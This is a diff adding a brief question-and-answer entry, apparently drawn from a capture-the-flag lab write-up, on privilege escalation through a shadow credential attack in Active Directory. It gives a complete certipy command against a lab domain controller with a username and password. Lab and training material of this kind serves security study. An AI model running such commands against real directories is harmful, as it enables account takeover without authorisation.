@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What method can you use to escalate privileges through a shadow credential attack?
+
+CONTEXT:
+You have permissions to manipulate the user account 'john'.
+
+METHOD / ANSWER:
+Command: `certipy shadow auto -target dc01.tombwatcher.htb -u sam -p '0xdf0xdf!' -account john`
+Explanation: This command requests a certificate that allows john to authenticate, effectively performing privilege escalation.
